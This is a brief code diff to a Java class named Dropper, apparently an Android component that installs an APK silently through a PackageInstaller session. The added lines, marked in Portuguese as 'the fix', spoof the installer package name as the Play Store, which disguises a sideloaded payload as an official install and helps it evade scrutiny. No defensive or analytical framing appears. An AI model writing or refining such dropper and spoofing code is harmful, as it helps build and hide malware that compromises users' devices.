@@ -167,6 +167,11 @@ public class Dropper {
         PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                 PackageInstaller.SessionParams.MODE_FULL_INSTALL);
 
+        // A CORREÇÃO: define o instalador como a Play Store
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            params.setInstallerPackageName("com.android.vending");
+        }
+
         int id = pi.createSession(params);
         PackageInstaller.Session s = pi.openSession(id);
 
@@ -190,4 +195,4 @@ public class Dropper {
         s.commit(pending.getIntentSender());
         s.close();
     }
-                }
+}
